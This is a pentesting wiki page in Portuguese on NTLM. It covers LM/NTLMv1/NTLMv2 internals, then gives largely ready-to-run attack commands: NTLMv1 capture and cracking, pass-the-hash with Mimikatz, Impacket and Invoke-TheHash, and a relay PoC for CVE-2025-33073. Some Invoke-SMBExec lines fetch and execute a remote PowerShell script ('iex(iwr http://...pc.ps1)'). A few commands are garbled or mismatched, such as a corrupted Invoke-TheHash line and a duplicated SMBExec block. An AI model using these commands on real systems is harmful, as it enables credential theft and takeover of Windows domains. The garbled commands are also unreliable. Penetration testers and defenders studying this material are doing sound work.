# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Informações Básicas

Em ambientes onde **Windows XP e Server 2003** estão em operação, hashes LM (Lan Manager) são utilizados, embora seja amplamente reconhecido que eles podem ser facilmente comprometidos. Um hash LM específico, `AAD3B435B51404EEAAD3B435B51404EE`, indica um cenário em que LM não é empregado, representando o hash de uma string vazia.

Por padrão, o protocolo de autenticação **Kerberos** é o método principal usado. NTLM (NT LAN Manager) entra em ação sob circunstâncias específicas: ausência de Active Directory, inexistência do domínio, falha do Kerberos devido a configuração incorreta, ou quando as conexões são tentadas usando um endereço IP em vez de um hostname válido.

A presença do cabeçalho **"NTLMSSP"** em pacotes de rede sinaliza um processo de autenticação NTLM.

O suporte aos protocolos de autenticação - LM, NTLMv1 e NTLMv2 - é fornecido por uma DLL específica localizada em `%windir%\Windows\System32\msv1\_0.dll`.

**Pontos-Chave**:

- hashes LM são vulneráveis e um hash LM vazio (`AAD3B435B51404EEAAD3B435B51404EE`) significa que ele não é usado.
- Kerberos é o método de autenticação padrão, com NTLM usado apenas em certas condições.
- Pacotes de autenticação NTLM são identificáveis pelo cabeçalho "NTLMSSP".
- Os protocolos LM, NTLMv1 e NTLMv2 são suportados pelo arquivo do sistema `msv1\_0.dll`.

## LM, NTLMv1 and NTLMv2

Você pode verificar e configurar qual protocolo será usado:

### GUI

Execute _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Há 6 níveis (de 0 a 5).

![](<../../images/image (919).png>)

### Registry

Isso definirá o nível 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Valores possíveis:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Esquema básico de autenticação de domínio NTLM

1. O **user** introduz as suas **credentials**
2. A máquina cliente **envia uma autenticação request** enviando o **domain name** e o **username**
3. O **server** envia o **challenge**
4. O **client encrypts** o **challenge** usando o hash da password como chave e envia-o como response
5. O **server sends** ao **Domain controller** o **domain name, the username, the challenge and the response**. Se **não houver** um Active Directory configurado ou se o domain name for o nome do server, as credentials são **checked locally**.
6. O **domain controller checks if everything is correct** e envia a informação para o server

O **server** e o **Domain Controller** conseguem criar um **Secure Channel** via servidor **Netlogon** porque o Domain Controller conhece a password do server (está dentro da db **NTDS.DIT**).

### Esquema de autenticação NTLM local

A autenticação é a mesma mencionada **before but** o **server** conhece o **hash of the user** que tenta autenticar dentro do ficheiro **SAM**. Portanto, em vez de pedir ao Domain Controller, o **server will check itself** se o user pode autenticar.

### NTLMv1 Challenge

O **challenge length is 8 bytes** e o **response is 24 bytes** de comprimento.

O **hash NT (16bytes)** é dividido em **3 parts of 7bytes each** (7B + 7B + (2B+0x00\*5)): a **last part is filled with zeros**. Depois, o **challenge** é **ciphered separately** com cada parte e os **resulting** bytes cifrados são **joined**. Total: 8B + 8B + 8B = 24Bytes.

**Problems**:

- Falta de **randomness**
- As 3 partes podem ser **attacked separately** para encontrar o NT hash
- **DES is crackable**
- A 3º key é composta sempre por **5 zeros**.
- Dado o **same challenge** a **response** será **same**. Portanto, podes dar como **challenge** à vítima a string "**1122334455667788**" e atacar a response usando **precomputed rainbow tables**.

### NTLMv1 attack

Hoje em dia é cada vez menos comum encontrar ambientes com Unconstrained Delegation configurado, mas isso não significa que não possas **abuse a Print Spooler service** configurado.

Podes abusar de algumas credentials/sessions que já tenhas no AD para **ask the printer to authenticate** contra algum **host under your control**. Depois, usando `metasploit auxiliary/server/capture/smb` ou `responder` podes **set the authentication challenge to 1122334455667788**, capturar a tentativa de autenticação e, se tiver sido feita usando **NTLMv1**, vais conseguir **crack it**.\
Se estiveres a usar `responder`, podes tentar **use the flag `--lm`** para tentar **downgrade** a **authentication**.\
_Nota que, para esta técnica, a autenticação tem de ser feita usando NTLMv1 (NTLMv2 is not valid)._

Lembra-te de que a printer vai usar a computer account durante a autenticação, e computer accounts usam **long and random passwords** que **probably won't be able to crack** usando **dictionaries** comuns. Mas a autenticação **NTLMv1** **uses DES** ([more info here](#ntlmv1-challenge)), portanto usando alguns serviços especialmente dedicados a cracking DES vais conseguir crack it (podes usar [https://crack.sh/](https://crack.sh) ou [https://ntlmv1.com/](https://ntlmv1.com), por exemplo).

### NTLMv1 attack with hashcat

NTLMv1 também pode ser quebrado com o NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) que formata mensagens NTLMv1 de uma maneira que pode ser quebrada com hashcat.

O comando
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
would output the below:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Crie um arquivo com o conteúdo de:
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Execute o hashcat (o distribuído é melhor por meio de uma ferramenta como hashtopolis), pois isso levará vários dias caso contrário.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Neste caso, sabemos que a senha é password, então vamos trapacear para fins de demonstração:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Agora precisamos usar o hashcat-utilities para converter as chaves des crackeadas em partes do hash NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Por fim, a última parte:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Combining them together:
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

O **comprimento do challenge é de 8 bytes** e **2 responses são enviadas**: uma tem **24 bytes** de comprimento e o comprimento da **outra** é **variável**.

**A primeira response** é criada cifrando com **HMAC_MD5** a **string** composta pelo **client e o domain** e usando como **key** o **hash MD4** do **NT hash**. Depois, o **resultado** será usado como **key** para cifrar com **HMAC_MD5** o **challenge**. Para isso, **um client challenge de 8 bytes será adicionado**. Total: 24 B.

**A segunda response** é criada usando **vários valores** (um novo client challenge, um **timestamp** para evitar **replay attacks**...)

Se você tiver um **pcap que capturou um processo de autenticação bem-sucedido**, pode seguir este guia para obter o domain, username, challenge e response e tentar quebrar a senha: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Assim que você tiver o hash da vítima**, pode usá-lo para **se passar por ela**.\
Você precisa usar uma **ferramenta** que irá **realizar** a autenticação **NTLM usando** esse hash, **ou** você pode criar um novo **sessionlogon** e **injetar** esse hash dentro do **LSASS**, para que, quando qualquer autenticação **NTLM** for realizada, **esse hash seja usado.** A última opção é o que o mimikatz faz.

**Por favor, lembre-se de que você também pode realizar ataques Pass-the-Hash usando contas de Computer.**

### **Mimikatz**

**Precisa ser executado como administrador**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Isso iniciará um processo que pertencerá aos usuários que executaram o mimikatz, mas internamente no LSASS as credenciais salvas serão as que estão nos parâmetros do mimikatz. Então, você pode acessar recursos de rede como se fosse esse usuário (semelhante ao truque `runas /netonly`, mas você não precisa saber a senha em texto simples).

### Pass-the-Hash from linux

Você pode obter execução de código em máquinas Windows usando Pass-the-Hash a partir do Linux.\
[**Acesse aqui para aprender como fazer isso.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

Você pode baixar [os binários do impacket para Windows aqui](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Neste caso, você precisa especificar um comando, cmd.exe e powershell.exe não são válidos para obter uma shell interativa)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Existem vários outros binários do Impacket...

### Invoke-TheHash

Você pode obter os scripts do PowerShell aqui: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Esta função é uma **mistura de todas as outras**. Você pode passar **vários hosts**, **excluir** alguns e **selecionar** a **opção** que deseja usar (_SMBExec, WMIExec, SMBClient, SMBEnum_). Se você selecionar **qualquer um** de **SMBExec** e **WMIExec**, mas **não** fornecer nenhum parâmetro _**Command**_, ele apenas irá **verificar** se você tem **permissões suficientes**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Precisa ser executado como administrador**

Esta ferramenta fará a mesma coisa que o mimikatz (modificar a memória do LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Execução remota manual do Windows com username e password


{{#ref}}
../lateral-movement/
{{#endref}}

## Extraindo credentials de um Windows Host

**Para mais informações sobre** [**como obter credentials de um Windows host, você deve ler esta página**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

O Internal Monologue Attack é uma técnica furtiva de extração de credentials que permite a um atacante recuperar hashes NTLM da máquina da vítima **sem interagir diretamente com o processo LSASS**. Diferente do Mimikatz, que lê hashes diretamente da memória e é frequentemente bloqueado por soluções de segurança de endpoint ou Credential Guard, esse ataque aproveita **chamadas locais ao pacote de autenticação NTLM (MSV1_0) via Security Support Provider Interface (SSPI)**. O atacante primeiro **rebaixa as configurações de NTLM** (por exemplo, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) para garantir que NetNTLMv1 seja permitido. Em seguida, ele impersona tokens de usuário existentes obtidos de processos em execução e aciona autenticação NTLM localmente para gerar respostas NetNTLMv1 usando um challenge conhecido.

Depois de capturar essas respostas NetNTLMv1, o atacante pode recuperar rapidamente os hashes NTLM originais usando **rainbow tables pré-computadas**, permitindo novos ataques Pass-the-Hash para lateral movement. Crucialmente, o Internal Monologue Attack continua furtivo porque não gera tráfego de rede, não injeta código e não aciona dumps diretos de memória, tornando-o mais difícil de detectar para os defensores em comparação com métodos tradicionais como Mimikatz.

Se NetNTLMv1 não for aceito — devido a políticas de segurança aplicadas, então o atacante pode não conseguir recuperar uma resposta NetNTLMv1.

Para lidar com esse caso, a ferramenta Internal Monologue foi atualizada: ela obtém dinamicamente um token de servidor usando `AcceptSecurityContext()` para ainda **capturar respostas NetNTLMv2** se o NetNTLMv1 falhar. Embora NetNTLMv2 seja muito mais difícil de crack, ele ainda abre caminho para relay attacks ou brute-force offline em casos limitados.

O PoC pode ser encontrado em **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay and Responder

**Leia um guia mais detalhado sobre como realizar esses ataques aqui:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parse NTLM challenges from a network capture

**Você pode usar** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)

Windows contém várias mitigações que tentam impedir ataques de *reflection*, nos quais uma autenticação NTLM (ou Kerberos) originada de um host é retransmitida de volta para o **mesmo** host para obter privilégios SYSTEM.

A Microsoft quebrou a maioria das cadeias públicas com MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) e patches posteriores, porém **CVE-2025-33073** mostra que as proteções ainda podem ser contornadas abusando da forma como o **cliente SMB trunca Service Principal Names (SPNs)** que contêm target-info *marshalled* (serializado).

### TL;DR of the bug
1. Um atacante registra um **DNS A-record** cujo label codifica um SPN serializado – por exemplo
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. A vítima é coagida a autenticar para esse hostname (PetitPotam, DFSCoerce, etc.).
3. Quando o cliente SMB passa a string de target `cifs/srv11UWhRCAAAAA…` para `lsasrv!LsapCheckMarshalledTargetInfo`, a chamada para `CredUnmarshalTargetInfo` **remove** o blob serializado, deixando **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (ou o equivalente Kerberos) agora considera o target como *localhost* porque a parte curta do host corresponde ao nome do computador (`SRV1`).
5. Consequentemente, o servidor define `NTLMSSP_NEGOTIATE_LOCAL_CALL` e injeta o **SYSTEM access-token do LSASS** no contexto (para Kerberos, uma subsession key marcada como SYSTEM é criada).
6. Fazer relay dessa autenticação com `ntlmrelayx.py` **ou** `krbrelayx.py` concede direitos completos de SYSTEM no mesmo host.

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* O patch do KB para **CVE-2025-33073** adiciona uma verificação em `mrxsmb.sys::SmbCeCreateSrvCall` que bloqueia qualquer conexão SMB cujo alvo contenha informações marshalled (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
* Impor **SMB signing** para impedir reflection mesmo em hosts sem patch.
* Monitorar registros DNS semelhantes a `*<base64>...*` e bloquear vetores de coerção (PetitPotam, DFSCoerce, AuthIP...).

### Detection ideas
* Capturas de rede com `NTLMSSP_NEGOTIATE_LOCAL_CALL` onde o IP do cliente ≠ IP do servidor.
* Kerberos AP-REQ contendo uma subsession key e um principal de cliente igual ao hostname.
* Windows Event 4624/4648 SYSTEM logons imediatamente seguidos por gravações SMB remotas do mesmo host.

Para a variante de reflection local de **March 2026** que abusa de **SMB arbitrary ports** e **TCP connection reuse** para alcançar `NT AUTHORITY\SYSTEM`, veja:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
